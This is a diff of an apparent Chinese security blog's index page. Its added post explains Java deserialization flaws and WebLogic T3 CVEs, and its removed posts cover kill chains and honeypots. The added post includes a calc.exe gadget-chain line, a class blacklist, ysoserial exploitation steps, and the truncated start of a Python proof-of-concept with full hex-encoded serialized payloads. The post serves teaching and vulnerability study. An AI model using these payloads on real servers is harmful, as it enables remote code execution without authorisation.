-<p>“安全需要更贴近应用程序，需要深入了解程序的核心进程和内存使用量，”Virsec Systems的创始人和首席技术官Satya Gupta说。“新的流程控制技术将嵌入到应用程序层面，能理解应用的协议和环境，可以将可接受的应用程序流程绘制出来（就像谷歌地图）。如果应用程序应该从A点走到B点，但是却出现了一段意外的路程，那么肯定出错了。”</p>
-<p><strong>攻击者也可以利用被泄露的身份信息或强度弱的密码。这一过程不需要安装恶意软件，也不用与C&amp;C服务器通信，不会产生横向操作。</strong>“寻找一份泄露的数据库或Amazon S3数据意味着攻击可以简便完成，从而避免和防御者交锋。”Obsidian Security的首席技术官Ben Johnson说。</p>
-<p>根据RedLock本月发布的一份报告，53%的组织使用Amazon S3等云存储服务，这至少导致了一个意外结果，即数据暴露在公众面前。今年夏天的早些时候，Skyhigh Networks报道称，7%的企业使用的所有AWS S3数据可以无限制访问，另有35%的企业未对数据加密。</p>
-<p><strong>由于数据是通过合法渠道传出，数据防泄露可能无法检测这种行为。</strong>Govshteyn说：“企业需要专门的工具来保护针对网络应用程序的攻击。”</p>
-<p><strong>DOS攻击也难以被杀伤链解释。</strong>“攻击者仍需选择目标，所以必须进行侦察阶段。”Cybereason的首席安全官Sam Curry说。但是在准备之后，攻击者将直接跳转到中断阶段。</p>
-<p>他补充说DOS攻击也可能只是攻击的第一步，用来掩盖其他恶意行为。“当系统崩溃时，攻击者可以创建一个漏洞，”他说，“或者创建一个高信噪的筛选器，来掩盖痕迹或破坏系统的信号发现能力。”</p>
-<p>他说，攻击者也可以添加步骤到游戏流程里。例如，他们可以花时间清理痕迹、设置中断、传播虚假数据，或安装未来用得上的后门。</p>
-<p>他们也可以重新安排各步骤的顺序，或者重复之前的步骤。这不是一个简单的线性过程。</p>
-<blockquote>
-<p><strong>这通常更像树状或根系的分支和蔓延，这一过程很复杂，会发生很多事情。</strong></p>
-</blockquote>
-<p><strong>目标达成阶段：不达目标，攻击不会停止</strong></p>
-<p><strong>在拒绝服务攻击案例中，中断不一定是攻击的最后一步。在攻击者成功地破坏、瘫痪或渗入系统后，攻击者可以重复这一过程。也可以转移到另一个阶段——盈利。</strong>Preempt Security的首席执行官 Ajit Sancheti 认为，攻击者可能采取任意形式的组合。比如，他们可以通过破坏基础设施来进行广告欺诈或发送垃圾邮件、向企业勒索赎金、出售他们在黑市上获得的数据，甚至劫持基础设施出租给其他罪犯。“攻击的盈利已经急剧增加。”</p>
-<p>他补充说，比特币的使用让攻击者更简便、安全地得到钱，这导致了攻击动机的变化。不同群体的数量参与也让黑市上被盗数据的消费变得更加复杂。这也为企业、执法部门和其他组织创造了合作破坏这一过程的机会。</p>
-<p>以被盗的支付卡信息为例。“一旦信用卡数据被盗，这些数据必须被测试、出售、用于获取商品或服务，反过来这些商品或服务必须转换为现金。”Splunk公司的安全研究主管Monzy Merza说。</p>
-<p><strong>这一切都早已超出了传统网络杀伤链的范畴。黑市生态系统也在影响了网络攻击周期中的攻击准备环节。</strong>攻击者们会分享身份凭证列表、漏洞或被修改的应用程序。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/11/18/洛克希德·马丁定义的“杀伤链模型/" data-id="cjc7iqrru000n5s1boqs1poul" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-蜜罐与内网安全" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/11/03/蜜罐与内网安全/" class="article-date">
-  <time datetime="2017-11-03T06:37:51.000Z" itemprop="datePublished">2017-11-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/11/03/蜜罐与内网安全/">蜜罐与内网安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://sosly.me/" target="_blank" rel="external">蜜罐相关文章笔记</a></p>
-<h3 id="0x01-蜜罐定义、分类及功能"><a href="#0x01-蜜罐定义、分类及功能" class="headerlink" title="0x01 蜜罐定义、分类及功能"></a>0x01 蜜罐定义、分类及功能</h3><p>研究Web攻防，少不了渗透测试，那在渗透测试的过程中，取得外网可访问的单台服务器权限后，下一步往往就是以所控制的服务器为跳板向未直接暴露在公网的内网服务器进行进一步渗透，俗称“内网渗透”。<br>内网往往意味着重要信息资产，数据库服务器、文件服务器等往往都部署在内网。研究内网安全保障中的内网攻击感知和攻击预警问题有实际的意义，要让网络管理员能及时察觉内部网络正在被攻击并且能够定位攻击源进而采取措施，而不至于当重要信息资产被侵害后还不自知。<br>蜜罐简单说来，是一种存在漏洞的、 暴露在网络中的一个虚假的服务（器），其价值在于被扫描、 攻击和攻陷。</p>
-<p>if 系统没有对外开放任何真实的服务<br>then 任何一个对它的连接尝试都是可疑的</p>
-<p>相比传统的防火墙技术和入侵检测技术，蜜罐技术更加主动和隐蔽，蜜罐的主要优势在于能诱导和记录网络攻击行为，阻止或延缓其对真正目标的攻击，而且能记录攻击日志，便于审计和回溯。<br>如果将蜜罐部署到外网，每天都能收到记录大量的攻击日志，很多只是批量的扫描，并不是针对性的攻击，这些行为说明不了什么问题。但是在内网不一样，因为默认情况下我们认为内网正常用户不会去扫描或者攻击，那么一旦内网的蜜罐捕获到可疑连接尝试，那就可以认为出现了攻击行为。<br>因此，我觉得将蜜罐技术应用到内网的攻击感知，天生就不用太考虑误报的问题，问题更聚焦。<br>通常将蜜罐(honeypot)定义为一种安全资源，它不需要提供实际的应用，蜜罐的存在价值就是诱导和记录攻击行为，从而了解攻击者的入侵方法和手段，并能够延缓其攻击进程，进而根据捕获的攻击行为数据，分析攻击者使用的攻击方法和工具，从而让防御方针对性地增强系统的安全防护能力。<br>蜜罐通常具备数据捕获、数据分析和数据控制方面的功能。数据捕获主要收集主机数据或者网络数据，主机上可以捕获攻击者的TCP连接情况、执行的命令、各种日志信息等，网络数据包括防护系统日志、网络流量数据等。但蜜罐的价值通常需要对捕获的数据进行分析后才能体现，主要包括网络协议类型分析、攻击行为分析和攻击数据包内容分析等。数据控制主要是指通过对蜜罐的对外数据发送和网络进行限制，使得当蜜罐系统被攻击者攻破时，也不会造成更多的危害。数据控制主要用来保障蜜罐本身的安全。<br>按交互程度分类：（1）低交互蜜罐（2）高交互蜜罐<br>按具体实现分类：（1）物理蜜罐（2）虚拟蜜罐<br>蜜罐技术(honeypot)就是为了改变这种被动的防护状况而出现的一种更加主动的防护技术。<br>蜜罐技术也从蜜罐发展到蜜网(honeynet)、再到分布式蜜网(distributed honeynet)和蜜场(honeyfarm)。蜜罐技术也不断应用到恶意样本捕获、入侵检测、攻击手法分析、网络取证、僵尸网络调查等安全方向。</p>
-<h3 id="0x02常见的内网攻击类型及检测"><a href="#0x02常见的内网攻击类型及检测" class="headerlink" title="0x02常见的内网攻击类型及检测"></a>0x02常见的内网攻击类型及检测</h3><p>端口扫描是一种攻击初期的信息收集技术，主要用来判断目标主机是否开放相应的端口和服务，通过向目标主机发送端口连接请求，然后根据目标主机的回应信息判断目标对应端口是否开放。<br>在内网重要信息系统分布区的相邻网址部署多个被动式蜜罐可以提高内网攻击的检测覆盖率。在内网中部署两台以上的被动式蜜罐，还可以避免单点故障，以及检测蜜罐被控的情况。</p>
-<h5 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h5><p>ARP欺骗的攻击过程可简要描述如下：<br>（1）攻击者在局域网段发送构造好的包含虚假IP-MAC对应信息的ARP应答包，使局域网的其他设备认为攻击者的机器是网关，从而充当假网关。<br>（2）被攻击者的将数据包发送给虚假网关。<br>（3）假网关（攻击者）分析接收到的数据包，把有价值的数据包记录下来（如邮箱、电商登录数据包）。<br>（4）假网关（攻击者）再把数据转发给真正的网关，充当中间人。<br>在内网渗透中可以通过ARP攻击嗅探到管理员的帐号密码等敏感信息。<br>通过”arp -a”命令获取到的IP-MAC对应表并非包括局域网内的全部设备，通常只包括和本机发生过数据通信的主机，但是列表中一定会包含网关，和试图攻击本机的局域网内主机，因此通过此种方法可以获取到需要的IP-MAC对应信息。</p>
-<h3 id="0x03多款开源蜜罐数据样例与应用分析"><a href="#0x03多款开源蜜罐数据样例与应用分析" class="headerlink" title="0x03多款开源蜜罐数据样例与应用分析"></a>0x03多款开源蜜罐数据样例与应用分析</h3><p>了解不同蜜罐能采集的原始数据字段与内容，可以更直观地看到蜜罐的采集能力，便于我们结合应用场景解决实际问题的时候去选择和组合不同的开源蜜罐技术。</p>
-<h5 id="现代密网-MHN"><a href="#现代密网-MHN" class="headerlink" title="现代密网(MHN)"></a>现代密网(MHN)</h5><p>现代密网（MHN，Modern Honey Network，以下简称MHN）是一个开源项目，它简化了蜜罐的部署并支持多种蜜罐软件作为数据终端。该项目用ThreatStream开源软件程序来部署，MHN支持将收集的数据汇总处理后保存在MongoDB数据库中，数据库的内容支持通过定制Web接口展示和存取。MHN系统功能示意如下图所示。<br><img src="/upload_image/Miwang-1.png" alt=""><br>MHN能够支持连接多种类型的蜜罐软件，添加和部署蜜罐过程相对自动化，部署完成后，蜜罐和MHN中心数据库支持通过开源的发布订阅协议hpfeeds来同步数据。</p>
-<p>MHN依赖多个蜜罐终端作为探测器Sensors去探测和收集攻击数据，并通过一种基于订阅者与发布者关系的传输协议hpfeeds将蜜罐终端的数据传输到MHN中心服务器，并存储到MongoDB数据库中，再通过honeymap和Webapp模块进行展示，示例页面如下图所示。<br><img src="/upload_image/Miwang-2.png" alt=""></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/11/03/蜜罐与内网安全/" data-id="cjc7iqrrw000s5s1bwsmipowl" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-HTTP-fuzzing-List" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/10/27/HTTP-fuzzing-List/" class="article-date">
-  <time datetime="2017-10-27T05:34:39.000Z" itemprop="datePublished">2017-10-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/10/27/HTTP-fuzzing-List/">HTTP fuzzing List</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="http://www.freebuf.com/sectool/106147.html" target="_blank" rel="external">http://www.freebuf.com/sectool/106147.html</a><br><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="external">https://github.com/xmendez/wfuzz</a><br><a href="https://github.com/fxkjd/simple-http-fuzzer" target="_blank" rel="external">https://github.com/fxkjd/simple-http-fuzzer</a></p>
-<p>参考 recon 系列<br><a href="https://zseano.com/tutorials/6.html" target="_blank" rel="external">https://zseano.com/tutorials/6.html</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/10/27/HTTP-fuzzing-List/" data-id="cjc7iqrr800075s1b11wl2xaa" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2018/01/05/几种常见检测思路的特点/" data-id="cjca1zrwr000r881b0a1g5unb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -815,7 +471,170 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/09/12/Java反序列化漏洞利用的学习与实践/" data-id="cjc7iqrri000c5s1bkomvra9g" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2017/09/12/Java反序列化漏洞利用的学习与实践/" data-id="cjca1zrwi000f881bhn04ua8y" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Java反序列化漏洞" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/10/Java反序列化漏洞/" class="article-date">
+  <time datetime="2017-09-10T03:46:54.000Z" itemprop="datePublished">2017-09-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/10/Java反序列化漏洞/">序列化和反序列化</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://xianzhi.aliyun.com/forum/topic/1825/" target="_blank" rel="external">先知首发地址</a></p>
+<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>序列化：把对象转换为字节序列的过程。<br>反序列化：把字节序列恢复为对象的过程。<br><img src="/upload_image/7.png" alt=""></p>
+<h5 id="JDK类库中的序列化API"><a href="#JDK类库中的序列化API" class="headerlink" title="JDK类库中的序列化API"></a>JDK类库中的序列化API</h5><p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。<br>　　java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br><img src="/upload_image/8.png" alt=""><br><strong>在Java中，对象的序列化与反序列化被广泛应用到RMI(远程方法调用)及网络传输中。</strong></p>
+<h5 id="Java序列化数据解析"><a href="#Java序列化数据解析" class="headerlink" title="Java序列化数据解析"></a>Java序列化数据解析</h5><p>数据开头为“AC ED 00 05”，数据内容包含了包名与类名、类中包含的变量名称、类型及变量的值。<br><img src="/upload_image/9.png" alt=""><br>ava.io.ObjectStreamConstants类中定义了STREAM_MAGIC与STREAM_VERSION，查看JDK1.5、1.6、1.7、1.8的ObjectStreamConstants类，STREAM_MAGIC值均为0xaced，STREAM_VERSION值均为5。</p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Breenmachine的这篇blog让java反序列化漏洞得到更多的关注，他介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。<br><img src="/upload_image/10.png" alt=""></p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>如果Java应用对用户输入，即不可信数据没有进行校验而直接做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p>
+<h3 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。<br>该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法，并且该方法在相关对象反序列化时并未进行任何校验.<br>Apache Commons Collections中提供了一个Transformer的类，这个接口的的功能就是把一个对象转换为另一个对象。<br><img src="/upload_image/11.png" alt=""><br>图上红框标注的是java反序列化漏洞的poc包含的类。<br>invokeTransformer：Transformer implementation that creates a new object instance by reflection.（通过反射，返回一个对象）<br>ChainedTransformer：Transformer implementation that chains the specified transformers together.（把transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）<br>ConstantTransformer：Transformer implementation that returns the same constant each time.（把一个对象转化为常量，并返回）<br>InvokerTransformer是比较关键的一个类，我们来看看它的实现：<br><img src="/upload_image/18.png" alt=""><br>我们可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象(反射机制就是可以把一个类,类的成员(函数,属性),当成一个对象来操作,希望读者能理解,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们.)，iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型，iArgs为对应方法的参数，在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数<br>POC：<br><img src="/upload_image/17.png" alt=""><br>Poc解读：整个poc的逻辑可以这么理解，构建innerMap的键值对，为其赋值，利用Transformed的decorate方法，可以对Map数据结构的key，value进行transform。该方法有三个参数，第一个为待转化的map对象，第二个为map对象内的key要经过的转化方法，第三个参数为map对象内的value要经过的转化方法。<br>TransformedMap.decoreate(目标map，key的转化对象（null或者单个链），value的转化对象)<br>poc对innerMap的value进行转换，当innerMap的value执行完一个完整的转换链，就完成了命令执行。</p>
+<p>如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。那如何让Java应用触发Transformer的变换呢？<br>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。<br>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。<br>我们观察到java运行库中有这样一个类AnnotationInvocationHandler，这个类有一个成员变量memberValues是Map类型.<br><img src="/upload_image/16.png" alt=""><br>AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数。<br><img src="/upload_image/20.png" alt=""><br>因此，我们只需要使用前面构造的Map来构造AnnotationInvocationHandler，进行序列化，当触发readObject()反序列化的时候，就能实现命令执行。<br>这段POC本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((Runtime)Runtime.class.getMethod(<span class="string">"getRuntime"</span>,null).invoke(null,null)).<span class="built_in">exec</span>(<span class="string">"calc.exe"</span>);</div></pre></td></tr></table></figure></p>
+<h3 id="Weblogic-Exploit"><a href="#Weblogic-Exploit" class="headerlink" title="Weblogic Exploit"></a>Weblogic Exploit</h3><p>Oracle Weblogic <strong>T3</strong> Deserialization Remote Code Execution Vulnerability<br>CVE-2015-4852<br>CVE-2016-0638<br>CVE-2016-3510<br>CVE-2017-3248<br>weblogic 采用T3协议进行序列化数据的传输，可以看到weblogic发送的JAVA序列化数据分为6个部分，第一部分的前四个字节为整个数据包的长度，第2-6部分均为JAVA序列化数据。经测试，必须先发送T3协议头数据包，再发送JAVA序列化数据包，才能使weblogic进行JAVA反序列化，进而触发漏洞。如果只发送JAVA序列化数据包，不先发送T3协议头数据包，无法触发漏洞。<br><img src="/upload_image/15.png" alt=""></p>
+<h5 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h5><p>blacklist<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">org.apache.commons.collections.functors*</div><div class="line">com.sun.org.apache.xalan.internal.xsltc.trax*</div><div class="line">javassist*</div><div class="line">org.codehaus.groovy.runtime.ConvertedClosure</div><div class="line">org.codehaus.groovy.runtime.ConversionHandler</div><div class="line">org.codehaus.groovy.runtime.MethodClosure</div></pre></td></tr></table></figure></p>
+<p>CVE-2015-4852的反序列化的点有三个：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</div><div class="line">weblogic.rjvm.MsgAbbrevInputStream.class</div><div class="line">weblogic.iiop.Utils.class</div></pre></td></tr></table></figure></p>
+<p>后面的几个漏洞实质都是对黑名单的一个绕过。</p>
+<h5 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h5><p>原理将反序列化的对象封装进了 weblogic.corba.utils.MarshalledObject，然后再对 MarshalledObject 进行序列化，生成 payload 字节码。反序列化时 MarshalledObject 不在 WebLogic 黑名单里，可正常反序列化，在反序列化时 MarshalledObject 对象调用 readObject 时对 MarshalledObject 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。</p>
+<h5 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h5><p>利用了黑名单之外的反序列化类，通过 JRMP 协议达到执行任意反序列化 payload。（Java远程消息交换协议 JRMP 即 Java Remote MessagingProtocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。）<br>下面给出一段在tenable找的描述<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">In the <span class="keyword">case</span> of WebLogic, we are interested <span class="keyword">in</span> yososerial<span class="string">'s JRMPListener.java payload. This serializes a RemoteObjectInvocationHandler which uses a UnicastRef object to establish a TCP connection to a remote server in order to get at the remote server'</span>s RMI registry. This connection uses JRMP so the client will deserialize whatever the server responds with, achieving unauthenticated remote code execution.</div><div class="line">Exploiting WebLogic</div><div class="line">To demonstrate the issue to ZDI and Oracle, Tenable created two scripts. The first script is a server that listens <span class="keyword">for</span> the callback, called jrmp_listener.py. When the connect back connects to jrmp_listener.py it will send a CommonCollections3 payload <span class="keyword">in</span> response <span class="built_in">which</span> will trigger the RCE on WebLogic. The second script sends the serialized object to WebLogic via t3 on TCP port 7001 (just like the original FoxGlove attack), called jrmp_connect_back.py. In order to exploit WebLogic, jrmp_listener.py must be executed before jrmp_connect_back.py. The result of the exploitation will cause the connect back, <span class="built_in">which</span> exists on its own thread, to be executed multiple <span class="built_in">times</span> (<span class="built_in">which</span> means an attacker could deliver multiple payloads).</div></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用的步骤：<br>1.找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。<br>2.应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库也行）<br>3.使用ysoserial来生成反序列化的payload，指定库名和想要执行的命令即可。<br>4.通过先前找到的传入对象方式进行对象注入，数据中载入payload，触发受影响应用中ObjectInputStream的反序列化操作，随后通过反射调用Runtime.getRunTime.exec即可完成利用。<br>最关键的是用恶意的序列化数据去替换正常的序列化数据</p>
+<h5 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h5><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial</a><br><img src="/upload_image/16.png" alt=""><br>下面给出一个’CVE-2016-0638’,’CVE-2016-3510’,’CVE-2017-3248’的无害poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import socket</div><div class="line">import time</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#  @author iswin@threathunter.org</span></div><div class="line"><span class="comment">#  reffer: nessus</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">VUL=[<span class="string">'CVE-2016-0638'</span>,<span class="string">'CVE-2016-3510'</span>,<span class="string">'CVE-2017-3248'</span>]</div><div class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</div><div class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>,<span class="string">'org.apache.commons.collections.functors.InvokerTransformer'</span>,<span class="string">'\\$Proxy[0-9]+'</span>]</div><div class="line"></div><div class="line">def t3handshake(sock,server_addr):</div><div class="line">    sock.connect(server_addr)</div><div class="line">    sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(1)</div><div class="line">    sock.recv(1024)</div><div class="line">    <span class="built_in">print</span> <span class="string">'handshake successful'</span></div><div class="line"></div><div class="line">def buildT3RequestObject(sock,port):</div><div class="line">    data1 = <span 